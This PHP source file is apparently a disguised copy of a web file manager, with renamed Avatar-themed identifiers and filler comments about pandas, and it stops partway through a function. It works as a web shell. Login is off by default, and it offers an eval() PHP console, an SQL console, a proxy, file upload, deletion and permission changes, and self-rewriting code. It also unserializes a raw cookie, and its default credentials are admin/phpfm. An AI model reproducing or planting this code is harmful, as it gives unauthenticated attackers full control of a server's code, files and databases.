<?php








/* Sancha Perales PHP File Manager */




// Baby pandas are very cute and playful


$tsaheyluToken = '{"authorize":"0","login":"admin","password":"phpfm","cookie_name":"fm_user","days_authorization":"30","script":"<script type=\"text\/javascript\" src=\"https:\/\/www.cdolivet.com\/editarea\/editarea\/edit_area\/edit_area_full.js\"><\/script>\r\n<script language=\"Javascript\" type=\"text\/javascript\">\r\neditAreaLoader.init({\r\nid: \"newcontent\"\r\n,display: \"later\"\r\n,start_highlight: true\r\n,allow_resize: \"both\"\r\n,allow_toggle: true\r\n,word_wrap: true\r\n,language: \"ru\"\r\n,syntax: \"php\"\t\r\n,toolbar: \"search, go_to_line, |, undo, redo, |, select_font, |, syntax_selection, |, change_smooth_selection, highlight, reset_highlight, |, help\"\r\n,syntax_selection_allow: \"css,html,js,php,python,xml,c,cpp,sql,basic,pas\"\r\n});\r\n<\/script>"}';

$pandoraTemplates = '{"Settings":"global $pandoraConfig;\r\nvar_export($pandoraConfig);","Backup SQL tables":"echo backupNaViTables();"}';
$eywaSqlTemplates = '{"All bases":"SHOW DATABASES;","All tables":"SHOW TABLES;"}';
$eywaTranslation = '{"id":"en","Add":"Add","Are you sure you want to delete this directory (recursively)?":"Are you sure you want to delete this directory (recursively)?","Are you sure you want to delete this file?":"Are you sure you want to delete this file?","Archiving":"Archiving","Authorization":"Authorization","Back":"Back","Cancel":"Cancel","Chinese":"Chinese","Compress":"Compress","Console":"Console","Cookie":"Cookie","Created":"Created","Date":"Date","Days":"Days","Decompress":"Decompress","Delete":"Delete","Deleted":"Deleted","Download":"Download","done":"done","Edit":"Edit","Enter":"Enter","English":"English","Error occurred":"Error occurred","File manager":"File manager","File selected":"File selected","File updated":"File updated","Filename":"Filename","Files uploaded":"Files uploaded","French":"French","Generation time":"Generation time","German":"German","Home":"Home","Quit":"Quit","Language":"Language","Login":"Login","Manage":"Manage","Make directory":"Make directory","Name":"Name","New":"New","New file":"New file","no files":"no files","Password":"Password","pictures":"pictures","Recursively":"Recursively","Rename":"Rename","Reset":"Reset","Reset settings":"Reset settings","Restore file time after editing":"Restore file time after editing","Result":"Result","Rights":"Rights","Russian":"Russian","Save":"Save","Select":"Select","Select the file":"Select the file","Settings":"Settings","Show":"Show","Show size of the folder":"Show size of the folder","Size":"Size","Spanish":"Spanish","Submit":"Submit","Task":"Task","templates":"templates","Ukrainian":"Ukrainian","Upload":"Upload","Value":"Value","Hello":"Hello"}';


// end configuration



// Preparations



$startBondTime = explode(' ', microtime());

$startBondTime = $startBondTime[1] + $startBondTime[0];

$naViLanguages = array('en','ru','de','fr','uk');


$avatarPath = empty($_REQUEST['path']) ? $avatarPath = realpath('.') : realpath($_REQUEST['path']);



$avatarPath = str_replace('\\', '/', $avatarPath) . '/';
$mainPandoraPath=str_replace('\\', '/',realpath('./'));



$maybeTsuTeyPhar = (version_compare(phpversion(),"5.3.0","<"))?true:false;



$eywaMessage = ''; // people all over the world like pandas


$pandoraDefaultLanguage = 'ru';



$detectPandoraLanguage = true;
$avatarVersion = 1.4;



//Authorization

$neytiriAuthenticated = json_decode($tsaheyluToken,true);




$neytiriAuthenticated['authorize'] = isset($neytiriAuthenticated['authorize']) ? $neytiriAuthenticated['authorize'] : 0; 
$neytiriAuthenticated['days_authorization'] = (isset($neytiriAuthenticated['days_authorization'])&&is_numeric($neytiriAuthenticated['days_authorization'])) ? (int)$neytiriAuthenticated['days_authorization'] : 30;



$neytiriAuthenticated['login'] = isset($neytiriAuthenticated['login']) ? $neytiriAuthenticated['login'] : 'admin';  
$neytiriAuthenticated['password'] = isset($neytiriAuthenticated['password']) ? $neytiriAuthenticated['password'] : 'phpfm';  
$neytiriAuthenticated['cookie_name'] = isset($neytiriAuthenticated['cookie_name']) ? $neytiriAuthenticated['cookie_name'] : 'fm_user';
$neytiriAuthenticated['script'] = isset($neytiriAuthenticated['script']) ? $neytiriAuthenticated['script'] : '';




// Little default config

$defaultPandoraConfig = array (


	'make_directory' => true, 


	'new_file' => true, 
	'upload_file' => true, 
	'show_dir_size' => false, //if true, show directory size â†’ maybe slow 
	'show_img' => true, 

	'show_php_ver' => true, 
	'show_php_ini' => false, // show path to current php.ini

	'show_gt' => true, // show generation time



	'enable_php_console' => true,
	'enable_sql_console' => true,
	'sql_server' => 'localhost',

	'sql_username' => 'root',


	'sql_password' => '',
	'sql_db' => 'test_base',



	'enable_proxy' => true,
	'show_phpinfo' => true,

	'show_xls' => true,
	'fm_settings' => true,
	'restore_time' => true,
	'fm_restore_time' => false,



);




if (empty($_COOKIE['fm_config'])) $pandoraConfig = $defaultPandoraConfig;


else $pandoraConfig = unserialize($_COOKIE['fm_config']);

// Change language
if (isset($_POST['fm_lang'])) { 
	setcookie('fm_lang', $_POST['fm_lang'], time() + (86400 * $neytiriAuthenticated['days_authorization']));
	$_COOKIE['fm_lang'] = $_POST['fm_lang'];
}
$hometreeLanguage = $pandoraDefaultLanguage;


// Detect browser language



if($detectPandoraLanguage && !empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) && empty($_COOKIE['fm_lang'])){
	$eywaLanguagePriority = explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']);

	if (!empty($eywaLanguagePriority)){
		foreach ($eywaLanguagePriority as $pandoraLanguages){


			$pandoraLng = explode(';', $pandoraLanguages);
			$pandoraLng = $pandoraLng[0];
			if(in_array($pandoraLng,$naViLanguages)){
				$hometreeLanguage = $pandoraLng;
				break;
			}
		}
	}
} 

// Cookie language is primary for ever

$hometreeLanguage = (empty($_COOKIE['fm_lang'])) ? $hometreeLanguage : $_COOKIE['fm_lang'];




// Localization


$pandoraLanguage = json_decode($eywaTranslation,true);

if ($pandoraLanguage['id']!=$hometreeLanguage) {

	$getPandoraLanguage = file_get_contents('https://raw.githubusercontent.com/Den1xxx/Filemanager/master/languages/' . $hometreeLanguage . '.json');

	if (!empty($getPandoraLanguage)) {


		//remove unnecessary characters


		$eywaTranslationString = str_replace("'",'&#39;',json_encode(json_decode($getPandoraLanguage),JSON_UNESCAPED_UNICODE));
		$eywaFileContent = file_get_contents(__FILE__);


		$searchEywa = preg_match('#translation[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $eywaFileContent, $bondMatches);
		if (!empty($bondMatches[1])) {

			$pandoraFileModified = filemtime(__FILE__);

			$replaceJake = str_replace('{"'.$bondMatches[1].'"}',$eywaTranslationString,$eywaFileContent);

			if (file_put_contents(__FILE__, $replaceJake)) {



				$eywaMessage .= __('File updated');
			}	else $eywaMessage .= __('Error occurred');


			if (!empty($pandoraConfig['fm_restore_time'])) touch(__FILE__,$pandoraFileModified);
		}	
		$pandoraLanguage = json_decode($eywaTranslationString,true);

	}



}


/* Functions */



//translation



function __($eywaText){
	global $pandoraLanguage;
	if (isset($pandoraLanguage[$eywaText])) return $pandoraLanguage[$eywaText];



	else return $eywaText;
};




//delete files and dirs recursively
function deleteQuaritchFiles($avatarFile, $eywaIsRecursive = false) {

	if($eywaIsRecursive && @is_dir($avatarFile)) {
		$ikranElementList = scanPandoraDirectory($avatarFile, '', '', true);


		foreach ($ikranElementList as $elementPandora) {
			if($elementPandora != '.' && $elementPandora != '..'){
				deleteQuaritchFiles($avatarFile . '/' . $elementPandora, true);
			}
		}
	}


	if(@is_dir($avatarFile)) {

		return rmdir($avatarFile);



	} else {

		return @unlink($avatarFile);
	}


}




//file perms
function permissionsNaViString($avatarFile, $ifEywa = false){


	$eywaPermissions = fileperms($avatarFile);
	$eywaInfo = '';


	if(!$ifEywa){
		if (($eywaPermissions & 0xC000) == 0xC000) {


			//Socket



			$eywaInfo = 's';
		} elseif (($eywaPermissions & 0xA000) == 0xA000) {


			//Symbolic Link
			$eywaInfo = 'l';
		} elseif (($eywaPermissions & 0x8000) == 0x8000) {


			//Regular


			$eywaInfo = '-';
		} elseif (($eywaPermissions & 0x6000) == 0x6000) {

			//Block special



			$eywaInfo = 'b';
		} elseif (($eywaPermissions & 0x4000) == 0x4000) {
			//Directory
			$eywaInfo = 'd';


		} elseif (($eywaPermissions & 0x2000) == 0x2000) {


			//Character special
			$eywaInfo = 'c';
		} elseif (($eywaPermissions & 0x1000) == 0x1000) {
			//FIFO pipe
			$eywaInfo = 'p';



		} else {

			//Unknown
			$eywaInfo = 'u';


		}
	}
  
	//Owner
	$eywaInfo .= (($eywaPermissions & 0x0100) ? 'r' : '-');
	$eywaInfo .= (($eywaPermissions & 0x0080) ? 'w' : '-');
	$eywaInfo .= (($eywaPermissions & 0x0040) ?


	(($eywaPermissions & 0x0800) ? 's' : 'x' ) :



	(($eywaPermissions & 0x0800) ? 'S' : '-'));
 

	//Group
	$eywaInfo .= (($eywaPermissions & 0x0020) ? 'r' : '-');



	$eywaInfo .= (($eywaPermissions & 0x0010) ? 'w' : '-');

	$eywaInfo .= (($eywaPermissions & 0x0008) ?
	(($eywaPermissions & 0x0400) ? 's' : 'x' ) :

	(($eywaPermissions & 0x0400) ? 'S' : '-'));

 
	//World
	$eywaInfo .= (($eywaPermissions & 0x0004) ? 'r' : '-');
	$eywaInfo .= (($eywaPermissions & 0x0002) ? 'w' : '-');


	$eywaInfo .= (($eywaPermissions & 0x0001) ?

	(($eywaPermissions & 0x0200) ? 't' : 'x' ) :


	(($eywaPermissions & 0x0200) ? 'T' : '-'));



	return $eywaInfo;
}


function convertNaViPermissions($flightMode) {

	$flightMode = str_pad($flightMode,9,'-');



	$pandoraTranslation = array('-'=>'0','r'=>'4','w'=>'2','x'=>'1');
	$flightMode = strtr($flightMode,$pandoraTranslation);


	$newIkranMode = '0';

	$eywaOwner = (int) $flightMode[0] + (int) $flightMode[1] + (int) $flightMode[2]; 
	$omatikayaGroup = (int) $flightMode[3] + (int) $flightMode[4] + (int) $flightMode[5]; 

	$pandoraGlobal = (int) $flightMode[6] + (int) $flightMode[7] + (int) $flightMode[8]; 


	$newIkranMode .= $eywaOwner . $omatikayaGroup . $pandoraGlobal;
	return intval($newIkranMode, 8);
}




function neytiriChangePermissions($avatarFile, $neytiriValue, $pandoraRecord = false) {

	$eywaResult = @chmod(realpath($avatarFile), $neytiriValue);
	if(@is_dir($avatarFile) && $pandoraRecord){

		$ikranElementList = scanPandoraDirectory($avatarFile);
		foreach ($ikranElementList as $elementPandora) {

			$eywaResult = $eywaResult && neytiriChangePermissions($avatarFile . '/' . $elementPandora, $neytiriValue, true);
		}
	}


	return $eywaResult;


}





//load files


function downloadEywaFile($torukFileName) {
    if (!empty($torukFileName)) {



		if (file_exists($torukFileName)) {
			header("Content-Disposition: attachment; filename=" . basename($torukFileName));   

			header("Content-Type: application/force-download");
			header("Content-Type: application/octet-stream");
			header("Content-Type: application/download");

			header("Content-Description: File Transfer");            
			header("Content-Length: " . filesize($torukFileName));		
			flush(); // this doesn't really matter.



			$pandoraPointer = fopen($torukFileName, "r");
			while (!feof($pandoraPointer)) {
				echo fread($pandoraPointer, 65536);
				flush(); // this is essential for large downloads



			} 
			fclose($pandoraPointer);



			die();



		} else {

			header('HTTP/1.0 404 Not Found', true, 404);
			header('Status: 404 Not Found'); 
			die();



        }
    } 
}

//show folder size



function calculatePandoraDirectorySize($neytiriFile,$eywaFormat=true) {
	if($eywaFormat)  {
		$batchSize=calculatePandoraDirectorySize($neytiriFile,false);


		if($batchSize<=1024) return $batchSize.' bytes';


		elseif($batchSize<=1024*1024) return round($batchSize/(1024),2).'&nbsp;Kb';

		elseif($batchSize<=1024*1024*1024) return round($batchSize/(1024*1024),2).'&nbsp;Mb';



		elseif($batchSize<=1024*1024*1024*1024) return round($batchSize/(1024*1024*1024),2).'&nbsp;Gb';


		elseif($batchSize<=1024*1024*1024*1024*1024) return round($batchSize/(1024*1024*1024*1024),2).'&nbsp;Tb'; //:)))
		else return round($batchSize/(1024*1024*1024*1024*1024),2).'&nbsp;Pb'; // ;-)



	} else {
		if(is_file($neytiriFile)) return filesize($neytiriFile);
		$batchSize=0;



		$eywaDirHandle=opendir($neytiriFile);
		while(($avatarFile=readdir($eywaDirHandle))!==false) {



			if($avatarFile=='.' || $avatarFile=='..') continue;
			if(is_file($neytiriFile.'/'.$avatarFile)) $batchSize+=filesize($neytiriFile.'/'.$avatarFile);
			else $batchSize+=calculatePandoraDirectorySize($neytiriFile.'/'.$avatarFile,false);


		}


		closedir($eywaDirHandle);



		return $batchSize+filesize($neytiriFile); 


	}
}

//scan directory


function scanPandoraDirectory($pandoraDirectoryPath, $explosiveThanator = '', $avatarType = 'all', $noSkyPeopleFilter = false) {
	$hometreeDirectory = $numPandoraDirs = array();


	if(!empty($explosiveThanator)){



		$explosiveThanator = '/^' . str_replace('*', '(.*)', str_replace('.', '\\.', $explosiveThanator)) . '$/';
	}



	if(!empty($avatarType) && $avatarType !== 'all'){
		$pandoraFunction = 'is_' . $avatarType;



	}
	if(@is_dir($pandoraDirectoryPath)){
		$torukFileHandle = opendir($pandoraDirectoryPath);

		while (false !== ($loakFilename = readdir($torukFileHandle))) {
			if(substr($loakFilename, 0, 1) != '.' || $noSkyPeopleFilter) {



				if((empty($avatarType) || $avatarType == 'all' || $pandoraFunction($pandoraDirectoryPath . '/' . $loakFilename)) && (empty($explosiveThanator) || preg_match($explosiveThanator, $loakFilename))){



					$hometreeDirectory[] = $loakFilename;
				}
			}
		}


		closedir($torukFileHandle);


		natsort($hometreeDirectory);
	}
	return $hometreeDirectory;

}



function eywaMainLink($getNaVi,$eywaLink,$eywaName,$avatarTitle='') {


	if (empty($avatarTitle)) $avatarTitle=$eywaName.' '.basename($eywaLink);

	return '&nbsp;&nbsp;<a href="?'.$getNaVi.'='.base64_encode($eywaLink).'" title="'.$avatarTitle.'">'.$eywaName.'</a>';

}





function pandoraArrayToOptions($naViArray,$kiriN,$selectedBond=''){



	foreach($naViArray as $eywaV){
		$ampSuitByte=$eywaV[$kiriN];

		$eywaResult.='<option value="'.$ampSuitByte.'" '.($selectedBond && $selectedBond==$ampSuitByte?'selected':'').'>'.$ampSuitByte.'</option>';
	}
	return $eywaResult;
}


function hometreeLanguageForm ($currentBond='en'){
return '
<form name="change_lang" method="post" action="">

	<select name="fm_lang" title="'.__('Language').'" onchange="document.forms[\'change_lang\'].submit()" >



		<option value="en" '.($currentBond=='en'?'selected="selected" ':'').'>'.__('English').'</option>
		<option value="de" '.($currentBond=='de'?'selected="selected" ':'').'>'.__('German').'</option>
		<option value="ru" '.($currentBond=='ru'?'selected="selected" ':'').'>'.__('Russian').'</option>
		<option value="fr" '.($currentBond=='fr'?'selected="selected" ':'').'>'.__('French').'</option>
		<option value="uk" '.($currentBond=='uk'?'selected="selected" ':'').'>'.__('Ukrainian').'</option>

	</select>
</form>

';


}
	



function hometreeRootDirectory($eywaDirectoryName){



	return ($eywaDirectoryName=='.' OR $eywaDirectoryName=='..');



}

function eywaPanel($pandoraString){

	$showEywaWarnings=ini_get('display_errors');



	ini_set('display_errors', '1');



	ob_start();
	eval(trim($pandoraString));
	$eywaText = ob_get_contents();


	ob_end_clean();
	ini_set('display_errors', $showEywaWarnings);

	return $eywaText;



}


//SHOW DATABASES

function connectToNaViSql(){
	global $pandoraConfig;
	return new mysqli($pandoraConfig['sql_server'], $pandoraConfig['sql_username'], $pandoraConfig['sql_password'], $pandoraConfig['sql_db']);



}



function executeLoakSql($eywaQuery){
	global $pandoraConfig;

	$eywaQuery=trim($eywaQuery);



	ob_start();
	$greatLeonopteryxConnection = connectToNaViSql();
	if ($greatLeonopteryxConnection->connect_error) {

		ob_end_clean();	


		return $greatLeonopteryxConnection->connect_error;
	}

	$greatLeonopteryxConnection->set_charset('utf8');
    $queriedKiri = mysqli_query($greatLeonopteryxConnection,$eywaQuery);


	if ($queriedKiri===false) {



		ob_end_clean();	
		return mysqli_error($greatLeonopteryxConnection);
    } else {

		if(!empty($queriedKiri)){
			while($neytiriRow = mysqli_fetch_assoc($queriedKiri)) {
				$viperwolfQueryResult[]=  $neytiriRow;

			}

		}
		$eywaDump=empty($viperwolfQueryResult)?'':var_export($viperwolfQueryResult,true);	
		ob_end_clean();	
		$greatLeonopteryxConnection->close();
		return '<pre>'.stripslashes($eywaDump).'</pre>';
	}

}



function backupNaViTables($naViTables = '*', $fullEywaBackup = true) {



	global $avatarPath;
	$ampSuitDatabase = connectToNaViSql();

	$pandoraDelimiter = "; \n  \n";
	if($naViTables == '*')	{
		$naViTables = array();


		$avatarResult = $ampSuitDatabase->query('SHOW TABLES');
		while($neytiriRow = mysqli_fetch_row($avatarResult))	{


			$naViTables[] = $neytiriRow[0];

		}

	} else {



		$naViTables = is_array($naViTables) ? $naViTables : explode(',',$naViTables);


	}



    
	$returnToPandora='';

	foreach($naViTables as $hometreeTable)	{
		$avatarResult = $ampSuitDatabase->query('SELECT * FROM '.$hometreeTable);


		$pandoraFieldCount = mysqli_num_fields($avatarResult);


		$returnToPandora.= 'DROP TABLE IF EXISTS `'.$hometreeTable.'`'.$pandoraDelimiter;



		$kiriRowAlt = mysqli_fetch_row($ampSuitDatabase->query('SHOW CREATE TABLE '.$hometreeTable));

		$returnToPandora.=$kiriRowAlt[1].$pandoraDelimiter;



        if ($fullEywaBackup) {
		for ($ampSuitI = 0; $ampSuitI < $pandoraFieldCount; $ampSuitI++)  {
			while($neytiriRow = mysqli_fetch_row($avatarResult)) {



				$returnToPandora.= 'INSERT INTO `'.$hometreeTable.'` VALUES(';

				for($jakeJ=0; $jakeJ<$pandoraFieldCount; $jakeJ++)	{



					$neytiriRow[$jakeJ] = addslashes($neytiriRow[$jakeJ]);

					$neytiriRow[$jakeJ] = str_replace("\n","\\n",$neytiriRow[$jakeJ]);
					if (isset($neytiriRow[$jakeJ])) { $returnToPandora.= '"'.$neytiriRow[$jakeJ].'"' ; } else { $returnToPandora.= '""'; }



					if ($jakeJ<($pandoraFieldCount-1)) { $returnToPandora.= ','; }
				}
				$returnToPandora.= ')'.$pandoraDelimiter;
			}

		  }
		} else { 

		$returnToPandora = preg_replace("#AUTO_INCREMENT=[\d]+ #is", '', $returnToPandora);
		}


		$returnToPandora.="\n\n\n";
	}

	//save file
    $avatarFile=gmdate("Y-m-d_H-i-s",time()).'.sql';
	$eywaHandle = fopen($avatarFile,'w+');
	fwrite($eywaHandle,$returnToPandora);
	fclose($eywaHandle);



	$skyPeopleAlert = 'onClick="if(confirm(\''. __('File selected').': \n'. $avatarFile. '. \n'.__('Are you sure you want to delete this file?') . '\')) document.location.href = \'?delete=' . $avatarFile . '&path=' . $avatarPath  . '\'"';
    return $avatarFile.': '.eywaMainLink('download',$avatarPath.$avatarFile,__('Download'),__('Download').' '.$avatarFile).' <a href="#" title="' . __('Delete') . ' '. $avatarFile . '" ' . $skyPeopleAlert . '>' . __('Delete') . '</a>';
}




function restoreNaViTables($sqlToBond) {



	$ampSuitDatabase = connectToNaViSql();


	$pandoraDelimiter = "; \n  \n";
    // Load and explode the sql file
    $neytiriFile = fopen($sqlToBond,"r+");
    $sqlEywaFile = fread($neytiriFile,filesize($sqlToBond));
    $sqlLoakArray = explode($pandoraDelimiter,$sqlEywaFile);
	
    //Process the sql file by statements
    foreach ($sqlLoakArray as $eywaStatement) {


        if (strlen($eywaStatement)>3){

			$avatarResult = $ampSuitDatabase->query($eywaStatement);

				if (!$avatarResult){
					$sqlPandoraErrorCode = mysqli_errno($ampSuitDatabase->connection);

					$sqlPandoraErrorText = mysqli_error($ampSuitDatabase->connection);
					$eywaSqlStatement      = $eywaStatement;
					break;
           	     }


           	  }

           }
if (empty($sqlPandoraErrorCode)) return __('Success').' â€” '.$sqlToBond;
else return $sqlPandoraErrorText.'<br/>'.$eywaStatement;
}


function pandoraImageUrl($loakFilename){
	return './'.basename(__FILE__).'?img='.base64_encode($loakFilename);


}



function eywaHomeStyle(){
	return '
input, input.fm_input {
	text-indent: 2px;
}


input, textarea, select, input.fm_input {

	color: black;

	font: normal 8pt Verdana, Arial, Helvetica, sans-serif;

	border-color: black;



	background-color: #FCFCFC none !important;


	border-radius: 0;
	padding: 2px;


}





input.fm_input {


	background: #FCFCFC none !important;


	cursor: pointer;


}





.home {



	background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAgRQTFRF/f396Ojo////tT02zr+fw66Rtj432TEp3MXE2DAr3TYp1y4mtDw2/7BM/7BOqVpc/8l31jcqq6enwcHB2Tgi5jgqVpbFvra2nBAV/Pz82S0jnx0W3TUkqSgi4eHh4Tsre4wosz026uPjzGYd6Us3ynAydUBA5Kl3fm5eqZaW7ODgi2Vg+Pj4uY+EwLm5bY9U//7jfLtC+tOK3jcm/71u2jYo1UYh5aJl/seC3jEm12kmJrIA1jMm/9aU4Lh0e01BlIaE///dhMdC7IA//fTZ2c3MW6nN30wf95Vd4JdXoXVos8nE4efN/+63IJgSnYhl7F4csXt89GQUwL+/jl1c41Aq+fb2gmtI1rKa2C4kJaIA3jYrlTw5tj423jYn3cXE1zQoxMHBp1lZ3Dgmqiks/+mcjLK83jYkymMV3TYk//HM+u7Whmtr0odTpaOjfWJfrHpg/8Bs/7tW/7Ve+4U52DMm3MLBn4qLgNVM6MzB3lEflIuL/+jA///20LOzjXx8/7lbWpJG2C8k3TosJKMA1ywjopOR1zYp5Dspiay+yKNhqKSk8NW6/fjns7Oz2tnZuz887b+W3aRY/+ms4rCE3Tot7V85bKxjuEA3w45Vh5uhq6am4cFxgZZW/9qIuwgKy0sW+ujT4TQntz423C8i3zUj/+Kw/a5d6UMxuL6wzDEr////cqJQfAAAAKx0Uk5T////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAWVFbEAAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAA2UlEQVQoU2NYjQYYsAiE8U9YzDYjVpGZRxMiECitMrVZvoMrTlQ2ESRQJ2FVwinYbmqTULoohnE1g1aKGS/fNMtk40yZ9KVLQhgYkuY7NxQvXyHVFNnKzR69qpxBPMez0ETAQyTUvSogaIFaPcNqV/M5dha2Rl2Timb6Z+QBDY1XN/Sbu8xFLG3eLDfl2UABjilO1o012Z3ek1lZVIWAAmUTK6L0s3pX+jj6puZ2AwWUvBRaphswMdUujCiwDwa5VEdPI7ynUlc7v1qYURLquf42hz45CBPDtwACrm+RDcxJYAAAAABJRU5ErkJggg==");
	background-repeat: no-repeat;



}';

}






function pandoraConfigCheckboxRow($eywaName,$eywaValue) {



	global $pandoraConfig;
	return '<tr><td class="row1"><input id="fm_config_'.$eywaValue.'" name="fm_config['.$eywaValue.']" value="1" '.(empty($pandoraConfig[$eywaValue])?'':'checked="true"').' type="checkbox"></td><td class="row2 whole"><label for="fm_config_'.$eywaValue.'">'.$eywaName.'</td></tr>';
}






function pandoraProtocol() {
	if (isset($_SERVER['HTTP_SCHEME'])) return $_SERVER['HTTP_SCHEME'].'://';
	if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') return 'https://';



	if (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443) return 'https://';

	if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') return 'https://';
	return 'http://';
}



function pandoraSiteUrl() {
	return pandoraProtocol().$_SERVER['HTTP_HOST'];

}





function getPandoraUrl($fullConnection=false) {

	$pandoraHost=$fullConnection?pandoraSiteUrl():'.';
	return $pandoraHost.'/'.basename(__FILE__);
}




function pandoraHome($fullConnection=false){
	return '&nbsp;<a href="'.getPandoraUrl($fullConnection).'" title="'.__('Home').'"><span class="home">&nbsp;&nbsp;&nbsp;&nbsp;</span></a>';


}



function runPandoraInput($pandoraLng) {


	global $pandoraConfig;



	$returnToPandora = !empty($pandoraConfig['enable_'.$pandoraLng.'_console']) ? 
	'



				<form  method="post" action="'.getPandoraUrl().'" style="display:inline">
				<input type="submit" name="'.$pandoraLng.'run" value="'.strtoupper($pandoraLng).' '.__('Console').'">
				</form>

' : '';



	return $returnToPandora;
}


function pandoraUrlProxy($bondMatches) {
	$eywaLink = str_replace('&amp;','&',$bondMatches[2]);



	$hometreeUrl = isset($_GET['url'])?$_GET['url']:'';
	$parseEywaUrl = parse_url($hometreeUrl);
	$pandoraHost = $parseEywaUrl['scheme'].'://'.$parseEywaUrl['host'].'/';



	if (substr($eywaLink,0,2)=='//') {



		$eywaLink = substr_replace($eywaLink,pandoraProtocol(),0,2);
	} elseif (substr($eywaLink,0,1)=='/') {

		$eywaLink = substr_replace($eywaLink,$pandoraHost,0,1);	

	} elseif (substr($eywaLink,0,2)=='./') {



		$eywaLink = substr_replace($eywaLink,$pandoraHost,0,2);	

	} elseif (substr($eywaLink,0,4)=='http') {
		//alles machen wunderschon

	} else {

		$eywaLink = $pandoraHost.$eywaLink;
	} 

	if ($bondMatches[1]=='href' && !strripos($eywaLink, 'css')) {
		$pandoraBasePath = pandoraSiteUrl().'/'.basename(__FILE__);
		$eywaQuery = $pandoraBasePath.'?proxy=true&url=';
		$eywaLink = $eywaQuery.urlencode($eywaLink);

	} elseif (strripos($eywaLink, 'css')){

		//ĞºĞ°Ğº-Ñ‚Ğ¾ Ñ‚Ğ¾Ğ¶Ğµ Ğ¿Ğ¾Ğ´Ğ¼ĞµĞ½ÑÑ‚ÑŒ Ğ½Ğ°Ğ´Ğ¾
	}
	return $bondMatches[1].'="'.$eywaLink.'"';
}
 



function pandoraTemplateForm($naViLanguageTemplate) {


	global ${$naViLanguageTemplate.'_templates'};


	$hometreeTemplateArray = json_decode(${$naViLanguageTemplate.'_templates'},true);



	$eywaString = '';

	foreach ($hometreeTemplateArray as $keyTemplatePandora=>$pandoraViewTemplate) {
		$eywaString .= '<tr><td class="row1"><input name="'.$naViLanguageTemplate.'_name[]" value="'.$keyTemplatePandora.'"></td><td class="row2 whole"><textarea name="'.$naViLanguageTemplate.'_value[]"  cols="55" rows="5" class="textarea_input">'.$pandoraViewTemplate.'</textarea> <input name="del_'.rand().'" type="button" onClick="this.parentNode.parentNode.remove();" value="'.__('Delete').'"/></td></tr>';

	}

return '
<table>

<tr><th colspan="2">'.strtoupper($naViLanguageTemplate).' '.__('templates').' '.runPandoraInput($naViLanguageTemplate).'</th></tr>
<form method="post" action="">

<input type="hidden" value="'.$naViLanguageTemplate.'" name="tpl_edited">


<tr><td class="row1">'.__('Name').'</td><td class="row2 whole">'.__('Value').'</td></tr>
'.$eywaString.'


<tr><td colspan="2" class="row3"><input name="res" type="button" onClick="document.location.href = \''.getPandoraUrl().'?fm_settings=true\';" value="'.__('Reset').'"/> <input type="submit" value="'.__('Save').'" ></td></tr>



</form>
<form method="post" action="">



<input type="hidden" value="'.$naViLanguageTemplate.'" name="tpl_edited">


<tr><td class="row1"><input name="'.$naViLanguageTemplate.'_new_name" value="" placeholder="'.__('New').' '.__('Name').'"></td><td class="row2 whole"><textarea name="'.$naViLanguageTemplate.'_new_value"  cols="55" rows="5" class="textarea_input" placeholder="'.__('New').' '.__('Value').'"></textarea></td></tr>

<tr><td colspan="2" class="row3"><input type="submit" value="'.__('Add').'" ></td></tr>
</form>


</table>



';



}






/* End Functions */



// authorization


if ($neytiriAuthenticated['authorize']) {
	if (isset($_POST['login']) && isset($_POST['password'])){
		if (($_POST['login']==$neytiriAuthenticated['login']) && ($_POST['password']==$neytiriAuthenticated['password'])) {

			setcookie($neytiriAuthenticated['cookie_name'], $neytiriAuthenticated['login'].'|'.md5($neytiriAuthenticated['password']), time() + (86400 * $neytiriAuthenticated['days_authorization']));
			$_COOKIE[$neytiriAuthenticated['cookie_name']]=$neytiriAuthenticated['login'].'|'.md5($neytiriAuthenticated['password']);

		}
	}
	if (!isset($_COOKIE[$neytiriAuthenticated['cookie_name']]) OR ($_COOKIE[$neytiriAuthenticated['cookie_name']]!=$neytiriAuthenticated['login'].'|'.md5($neytiriAuthenticated['password']))) {


		echo '
<!doctype html>



<html>



<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>'.__('File manager').'</title>
</head>
<body>
<form action="" method="post">


'.__('Login').' <input name="login" type="text">&nbsp;&nbsp;&nbsp;
'.__('Password').' <input name="password" type="password">&nbsp;&nbsp;&nbsp;


<input type="submit" value="'.__('Enter').'" class="fm_input">
</form>
'.hometreeLanguageForm($hometreeLanguage).'
</body>
</html>



';  



die();
	}



	if (isset($_POST['quit'])) {



		unset($_COOKIE[$neytiriAuthenticated['cookie_name']]);



		setcookie($neytiriAuthenticated['cookie_name'], '', time() - (86400 * $neytiriAuthenticated['days_authorization']));

		header('Location: '.pandoraSiteUrl().$_SERVER['REQUEST_URI']);
	}
}


// Change config
if (isset($_GET['fm_settings'])) {



	if (isset($_GET['fm_config_delete'])) { 
		unset($_COOKIE['fm_config']);
		setcookie('fm_config', '', time() - (86400 * $neytiriAuthenticated['days_authorization']));



		header('Location: '.getPandoraUrl().'?fm_settings=true');
		exit(0);


	}	elseif (isset($_POST['fm_config'])) { 
		$pandoraConfig = $_POST['fm_config'];
		setcookie('fm_config', serialize($pandoraConfig), time() + (86400 * $neytiriAuthenticated['days_authorization']));
		$_COOKIE['fm_config'] = serialize($pandoraConfig);


		$eywaMessage = __('Settings').' '.__('done');

	}	elseif (isset($_POST['fm_login'])) { 

		if (empty($_POST['fm_login']['authorize'])) $_POST['fm_login'] = array('authorize' => '0') + $_POST['fm_login'];
		$loginToAvatarForm = json_encode($_POST['fm_login']);
		$eywaFileContent = file_get_contents(__FILE__);

		$searchEywa = preg_match('#authorization[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $eywaFileContent, $bondMatches);

		if (!empty($bondMatches[1])) {

			$pandoraFileModified = filemtime(__FILE__);

